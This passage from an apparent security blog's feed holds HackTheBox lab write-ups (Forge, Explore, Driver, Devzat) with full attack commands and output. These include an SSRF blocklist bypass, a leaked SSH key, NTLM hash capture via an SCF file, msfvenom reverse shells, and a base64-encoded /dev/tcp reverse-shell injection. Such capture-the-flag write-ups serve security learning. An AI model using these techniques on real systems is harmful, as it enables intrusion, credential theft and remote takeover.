&amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;amp;lt;url&amp;amp;gt;.&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; We now have credentials for the ftp service, however we can’t use them to login since the port is filtered. However, ftp services can also be accessed through most browsers with the format ftp://FTP_Username:FTP_Password@Host. We can use the upload functionality described above to upload the contents of the ftp directory. However, if we attempt to to use the url http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.0.1, we get told it contains a blacklisted adress, most likely 127.0.0.1. If we use another url like http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.1.1 we get through though.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ curl http://forge.htb/uploads/06EuoQwcl1WLefV037u5drwxr-xr-x 3 1000 1000 4096 Aug 04 2021 snap-rw-r----- 1 1000 1000 33 Jun 22 18:30 user.txtWe now have access to the user users home directory. To get a foothold on the system we can read the contents of their .ssh folder to get their ssh key.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ curl http://forge.htb/uploads/55nxaE6PJgCaI3jCd5kG-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6ukr6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3DWJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8GmL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR...wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAbRVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQbnR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=-----END OPENSSH PRIVATE KEY-----We can now login on the forge machine.┌──(bitis㉿workstation)-[~/htb/Machines/Forge]└─$ ssh -i user_sshkey user@forge.htb The authenticity of host &#39;forge.htb (10.129.84.126)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:ezqn5XF0Y3fAiyCDw46VNabU1GKFK0kgYALpeaUmr+o.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yes...user@forge:~$ Privilege escalationOnce in, we can run sudo -l, which reveals that we can run a python script as root.user@forge:~$ sudo -lMatching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.pyThe content of the script can be found below.#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) breakexcept Exception as e: print(e) pdb.post_mortem(e.__traceback__)finally: quit()The creates a listener on a random local port in the range 1025-65535. Once connected we will be prompted for an admin password which is luckily hardcoded into the script in plaintext. If we give it an input it doesn’t expect it will drop us into a python debugger shell. We can then use the techniques outlinede here to escalate our privileges. The output can be seen belowuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:59884user@forge:~$ nc localhost 59884Enter the secret passsword: secretadminpasswordWelcome admin!What do you wanna do: [1] View processes[2] View free memory[3] View listening sockets[4] QuitIf we enter some nonsense input in our netcat listener the pdb shell will open on in the session running the script:user@forge:~$ nc localhost 59884Enter the secret passsword: secretadminpasswordWelcome admin!What do you wanna do: [1] View processes[2] View free memory[3] View listening sockets[4] Quitshubiduahuser@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:59884invalid literal for int() with base 10: b&#39;fagepn&#39;&amp;gt; /opt/remote-manage.py(27)&amp;lt;module&amp;gt;()-&amp;gt; option = int(clientsock.recv(1024).strip())(Pdb) import os(Pdb) os.system(&quot;/bin/bash&quot;)root@forge:/home/user# Rooted!" }, { "title": "Explore writeup", "url": "/posts/Explore/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, adb, android", "date": "2022-06-22 13:00:00 +0200", "snippet": "SummaryThis was an easy android box centered around enumerating an android system, as well as using knowledge of adb features to root the device.FootholdWe start out by doing a port scan with nmap.┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ nmap -sV -sC -p- 10.129.137.244Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:59 CESTNmap scan report for 10.129.137.244Host is up (0.057s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)5555/tcp filtered freeciv42833/tcp open unknown...59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn&#39;t have a title (text/plain).2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :...Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 113.41 secondsThe system is hosting an sh service on port 2222, as well as a “freeciv” service on port 5555. Port 42833 is hosting an unknown service and port 59777 is hosting a Bukkit service. Further examination and some googling reveals that 5555 is also used by adb on some Android devices. That said, it is filtered and therefore not available to us at the moment, instead if we search for port 59777, it seems like it is actually used by a service named ES File Explorer. It is also mentioned that the service contains a vulnerability.I found a POC for the vulnerability here. Using the POC to have a look at the file system reveals an insteresting file.┌──(bitis㉿workstation)-[~/htb/Machines/Explore/ESFileExplorerOpenPortVuln]└─$ python3 poc.py --cmd listPics --host 10.129.137.244[*] Executing command: listPics on 10.129.137.244[*] Server responded with: 200{&quot;name&quot;:&quot;concept.jpg&quot;, &quot;time&quot;:&quot;4/21/21 02:38:08 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/concept.jpg&quot;, &quot;size&quot;:&quot;135.33 KB (138,573 Bytes)&quot;, },{&quot;name&quot;:&quot;anc.png&quot;, &quot;time&quot;:&quot;4/21/21 02:37:50 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/anc.png&quot;, &quot;size&quot;:&quot;6.24 KB (6,392 Bytes)&quot;, },{&quot;name&quot;:&quot;creds.jpg&quot;, &quot;time&quot;:&quot;4/21/21 02:38:18 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/creds.jpg&quot;, &quot;size&quot;:&quot;1.14 MB (1,200,401 Bytes)&quot;, },{&quot;name&quot;:&quot;224_anc.png&quot;, &quot;time&quot;:&quot;4/21/21 02:37:21 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/224_anc.png&quot;, &quot;size&quot;:&quot;124.88 KB (127,876 Bytes)&quot;}There is a jpg on the system named creds. Unfortunately, the POC does not allow us to download files from the system. Luckily metasploit has a module for this vulnerability as well, with the functionality to download arbitrary files.msf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; show actionsAuxiliary actions: Name Description ---- ----------- APPLAUNCH Launch an app. ACTIONITEM required. GETDEVICEINFO Get device info GETFILE Get a file from the device. ACTIONITEM required. LISTAPPS List all the apps installed LISTAPPSALL List all the apps installed LISTAPPSPHONE List all the phone apps installed LISTAPPSSDCARD List all the apk files stored on the sdcard LISTAPPSSYSTEM List all the system apps installed LISTAUDIOS List all the audio files LISTFILES List all the files on the sdcard LISTPICS List all the pictures LISTVIDEOS List all the videosmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; set action LISTPICSaction =&amp;gt; LISTPICSmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; run[+] 10.129.137.244:59777 concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg 224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; set action GETFILEaction =&amp;gt; GETFILEmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpgACTIONITEM =&amp;gt; /storage/emulated/0/DCIM/creds.jpgmsf6 auxiliary(scanner/http/es_file_explorer_open_port) &amp;gt; run[+] 10.129.137.244:59777 - /storage/emulated/0/DCIM/creds.jpg saved to /root/.msf4/loot/20220622220108_default_10.129.137.244_getFile_736928.jpg[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedThe jpg can be seen below.Privilege escalationWe can now login as Kristi on the Android device. While doing so we will do port forwarding to communicate with port 5555 on the target system.┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ ssh -L 5555:127.0.0.1:5555 kristi@10.129.137.244 -p 2222 255 ⨯Unable to negotiate with 10.129.137.244 port 2222: no matching host key type found. Their offer: ssh-rsa ┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ ssh -L 5555:127.0.0.1:5555 kristi@10.129.137.244 -p 2222 -o HostKeyAlgorithms=ssh-rsa 255 ⨯The authenticity of host &#39;[10.129.137.244]:2222 ([10.129.137.244]:2222)&#39; can&#39;t be established.RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;[10.129.137.244]:2222&#39; (RSA) to the list of known hosts.Password authentication(kristi@10.129.137.244) Password: :/ $ Once the port has been forwarded, we can can connect via adb. Once connected, adb offers commands such as adb root and adb unroot to root and unroot the user connecting via adb.┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ adb connect localhost:5555 connected to localhost:5555 ┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ adb devices List of devices attachedlocalhost:5555 device ┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ adb root restarting adbd as root ┌──(bitis㉿workstation)-[~/htb/Machines/Explore]└─$ adb shellx86_64:/ # id uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0x86_64:/ # Rooted!" }, { "title": "Driver writeup", "url": "/posts/Driver/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, windows, metasploit, printer", "date": "2022-06-21 20:00:00 +0200", "snippet": "SummaryThis quite an interesting easy box, or at least the foothold step is. It starts out with using an scf file to force the target system to connect to the attacker system when opened. The attacker system usse responder to steal the NTLM hash of the user trying to connect. From there however it quite straight forward to get root access on the system meterpreter.FootholdLet’s start out by doing a port scan with nmap:Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-13 11:35 EDTNmap scan report for 10.129.238.26Host is up (0.027s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-10-13T22:35:39|_ start_date: 2021-10-13T22:32:37The port scan shows that it is a Windows machine, hosting a web application on port 80, as well as SMB on port 445 and RPC on port 135.Visiting the web application we get greeted with a password prompt. Since this is an easy box, we should try default credentials. The credentials admin:admin allows us to login to the site.The only tab we can naigate to is the “upload firmware” tab.As can be seen, it is mentioned that the uploaded software will be manually reviewed. I found the following blogpost which describes how a writeable SMB share can be leveraged into hosting an scf file, which when viewed will execute some limited commands. This can be used to force the target system into requesting a resource from our machine, and we can then use responder to capture the hashes of the users trying to access the resource. We first setuo responder:┌──(bitis㉿workstation)-[~/htb/Machines/Driver]└─$ sudo responder -w -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp;amp; MDNS Responder 3.1.1.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON]We then use the upload functionality on the website to upload a scf file with the following content:[Shell]Command=2IconFile=\\\\10.10.17.182\\share\\based.ico[Taskbar]Command=ToggleDesktop We then capture the hash of the tony user:The captured hash is an NTLMv2 hash, and can be cracked with hashcat.Dictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385TONY::DRIVER:606023421617185a:f529bb0dd367ca7ceaf6760da48aa0d8:010100000000000080cdf4d4ce85d801dc17fcdffe34b71600000000020008005a0051003700570001001e00570049004e002d00590055004a0035004d0055005a0033004d004900520004003400570049004e002d00590055004a0035004d0055005a0033004d00490052002e005a005100370057002e004c004f00430041004c00030014005a005100370057002e004c004f00430041004c00050014005a005100370057002e004c004f00430041004c000700080080cdf4d4ce85d801060004000200000008003000300000000000000000000000002000008b1385354cfd60740b8c7ad96bd4c4f7f1fb0ff6e3f04d534f4f279ca063a6670a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e00310038003200000000000000000000000000:liltony Session..........: hashcatStatus...........: CrackedHash.Mode........: 5600 (NetNTLMv2)Hash.Target......: TONY::DRIVER:606023421617185a:f529bb0dd367ca7ceaf67...000000Time.Started.....: Wed Jun 22 00:33:06 2022 (0 secs)Time.Estimated...: Wed Jun 22 00:33:06 2022 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 1188.6 kH/s (2.02ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 32768/14344385 (0.23%)Rejected.........: 0/32768 (0.00%)Restore.Point....: 28672/14344385 (0.20%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: softball27 -&amp;gt; eatme1Hardware.Mon.#1..: Temp: 59c Util: 13%We now have the credentials tony:liltony.We can then proceed to login as the tony user via evil-winrm:┌──(bitis㉿workstation)-[~/htb/Machines/Driver]└─$ evil-winrm -i 10.129.84.206 -u tony -p liltony Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; Privilege escalationAs we saw in the Devel box, a meterpreter session on a Windows system can be very helpful when it comes to exploiting the system. We’ll prepare a meterpreter revershell via msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.182 LPORT=1337 -f exe &amp;gt; evil.exeWe will then upload the payload generated by msfvenom via evil-winrm:*Evil-WinRM* PS C:\\Users\\tony\\Documents&amp;gt; upload evil.exeInfo: Uploading evil.exe to C:\\Users\\tony\\Documents\\evil.exe Data: 98400 bytes of 98400 bytes copiedInfo: Upload successful!We then setup a meterpreter listener in metasploit┌──(bitis㉿workstation)-[~/htb/Machines/Driver]└─$ sudo msfconsolemsf6 &amp;gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:1337 [*] Sending stage (175686 bytes) to 10.129.84.206[*] Meterpreter session 1 opened (10.10.17.182:1337 -&amp;gt; 10.129.84.206:49429) at 2022-06-22 00:45:52 +0200meterpreter &amp;gt; background[*] Backgrounding session 1...msf6 exploit(multi/handler) &amp;gt; use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1msf6 post(multi/recon/local_exploit_suggester) &amp;gt; run[*] 10.129.84.206 - Collecting local exploits for x86/windows...[*] 10.129.84.206 - 167 exploit checks are being tried...[+] 10.129.84.206 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.[+] 10.129.84.206 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.[+] 10.129.84.206 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.[+] 10.129.84.206 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.[+] 10.129.84.206 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.[+] 10.129.84.206 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions[+] 10.129.84.206 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.[*] Running check method for exploit 41 / 41[*] 10.129.84.206 - Valid modules for session 1:Based on the sysinfo command we can tell the system is running on x64 architecture.meterpreter &amp;gt; sysinfoComputer : DRIVEROS : Windows 10 (10.0 Build 10240).Architecture : x64System Language : en_USDomain : WORKGROUPLogged On Users : 1Meterpreter : x64/windowsWe can use the ricoh exploit to get root access:msf6 exploit(windows/local/ricoh_driver_privesc) &amp;gt; set payload windows/x64/meterpreter/reverse_tcppayload =&amp;gt; windows/x64/meterpreter/reverse_tcpmsf6 exploit(windows/local/ricoh_driver_privesc) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable. Ricoh driver directory has full permissions[*] Adding printer wnahEkzl...[*] Sending stage (200774 bytes) to 10.129.84.206[*] Meterpreter session 4 opened (10.10.17.182:4444 -&amp;gt; 10.129.84.206:49432) at 2022-06-22 01:09:43 +0200[*] Meterpreter session 5 opened (10.10.17.182:4444 -&amp;gt; 10.129.84.206:49433) at 2022-06-22 01:13:47 +0200[*] Deleting printer wnahEkzlmeterpreter &amp;gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &amp;gt; Rooted!" }, { "title": "Devzat writeup", "url": "/posts/Devzat/", "categories": "Writeup, HackTheBox", "tags": "medium-box, api, git, jwt", "date": "2022-06-21 17:00:00 +0200", "snippet": "SummaryThis box focuses a lot on enumeration and source code review. We can abuse an api to achieve remote code execiton on the target system. We can then pivot to a different user via an Authentication Bypass in the influxdb service. Source code for a development instance of the devzat chat service can then be accessed which contains a password that allows us to read any file on the system.FootholdLet’s start out with a doing a port scan with nmap:# Nmap 7.92 scan initiated Tue Jan 18 17:38:37 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.164.185Nmap scan report for devzat.htb (10.129.164.185)Host is up (0.043s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)| 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)|_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-title: devzat - where the devs at|_http-server-header: Apache/2.4.41 (Ubuntu)8000/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-Go| ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.92%I=7%D=1/18%Time=61E74198%P=x86_64-pc-linux-gnu%r(NUSF:LL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jan 18 17:39:52 2022 -- 1 IP address (1 host up) scanned in 75.62 secondsAs can be seen 2 ports, 22 and 8000 are hosting ssh services. Port 80 is hosting a http service. If we start out by visiting the web application hosted on port 80 we get greeted with the following:We should also enumerate vhosts with gobuster:┌──(bitis㉿workstation)-[~/htb/Machines/devzat]└─$ gobuster vhost -u devzat.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://devzat.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/21 20:57:52 Starting gobuster in VHOST enumeration mode===============================================================Found: pets.devzat.htb (Status: 200) [Size: 510]Adding pets.devzat.htb to our /etc/hosts file, we can now visit the site:We can now scan for directories via gobuster on the pets page (Note that we are blacklisting the 200 status code since all directories will give this status):┌──(bitis㉿workstation)-[~/htb/Machines/devzat]└─$ gobuster dir -u http://pets.devzat.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -b 200 ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://pets.devzat.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes: 200[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/21 21:13:15 Starting gobuster in directory enumeration mode===============================================================/css (Status: 301) [Size: 40] [--&amp;gt; /css/]/build (Status: 301) [Size: 42] [--&amp;gt; /build/]/server-status (Status: 403) [Size: 280] /.git (Status: 301) [Size: 41] [--&amp;gt; /.git/] ===============================================================2022/06/21 21:17:08 Finished===============================================================We found a .git directory. We can use the git-dumper tool to download as much as possible from the directory.┌──(bitis㉿workstation)-[~/htb/Machines/devzat]└─$ git-dumper http://pets.devzat.htb/.git/ out [-] Testing http://pets.devzat.htb/.git/HEAD [200][-] Testing http://pets.devzat.htb/.git/ [200][-] Fetching .git recursively...[-] Fetching http://pets.devzat.htb/.git/hooks/update.sample [200][-] Fetching http://pets.devzat.htb/.git/logs/refs/heads/master [200][-] Running git checkout .Updated 39 paths from the index...──(bitis㉿workstation)-[~/htb/Machines/devzat/out]└─$ ls characteristics go.mod go.sum main.go petshop start.sh staticReading main.go, we discover an interesting function named loadcharacter:func loadCharacter(species string) string { cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species) stdoutStderr, err := cmd.CombinedOutput() if err != nil { return err.Error() } return string(stdoutStderr)}Ìt takes a string as argument and then inserts it into a sh command without any sanitization. Reading on, we find the function calling this one:func addPet(w http.ResponseWriter, r *http.Request) { reqBody, _ := ioutil.ReadAll(r.Body) var addPet Pet err := json.Unmarshal(reqBody, &amp;amp;addPet) if err != nil { e := fmt.Sprintf(&quot;There has been an error: %+v&quot;, err) http.Error(w, e, http.StatusBadRequest) return } addPet.Characteristics = loadCharacter(addPet.Species) Pets = append(Pets, addPet) w.WriteHeader(http.StatusOK) fmt.Fprint(w, &quot;Pet was added successfully&quot;)}The addPet function calls the loadCharacter function. This function, in turn, is called by the petHandler function which handles calls to the pets API located at the /api/pet endpoint. To exploit this we simply need to do a post-request to this endpoint containing a json object describing a pet where the species field contains our injected commands. We can use curl to interact with the API:┌──(bitis㉿workstation)-[~/htb/Machines/devzat/out]└─$ curl -X POST -d &#39;{&quot;name&quot;: &quot;Cicada&quot;,&quot;species&quot;: &quot;cat; echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xODIvMTMzNyAwPiYx | base64 -d | bash&quot;, &quot;characteristics&quot;: &quot;cat&quot;}&#39; -H &quot;&#39;Content-Type&#39;: &#39;application/json&#39;&quot; &quot;http://pets.devzat.htb/api/pet&quot;This gives us a reverse shell and access to the patric user.┌──(bitis㉿workstation)-[~/htb/Machines/devzat]└─$ nc -lvnp 1337 listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.136.15] 50534/bin/sh: 0: can&#39;t access tty; job control turned off$ iduid=1000(patrick) gid=1000(patrick) groups=1000(patrick)$ An ssh key belonging to patric can be found in his home directory, and can be used to get a more stable shell.PivotListing the contents of the /home direcotry list another user, which means w emost likely have to pivot to this user before rooting the box.atrick@devzat:/home$ lscatherine patrickIf we go back to the devzat site, we see the following:Joining the chat as patrick lets us see his chat with the admin:patrick@devzat:/home$ ssh -l patrick -p 8000 localhostThe authenticity of host &#39;[localhost]:8000 ([127.0.0.1]:8000)&#39; can&#39;t be established.RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;[localhost]:8000&#39; (RSA) to the list of known hosts.admin: Hey patrick, you there?patrick: Sure, shoot boss!admin: So I setup the influxdb for you as we discussed earlier in business meeting.patrick: Cool 👍admin: Be sure to check it out and see if it works for you, will ya?patrick: Yes, sure. Am on it!devbot: admin has left the chatWelcome to the chat. There are no more usersdevbot: patrick has joined the chatpatrick: As we can see, the machine is hosting an influxdb. 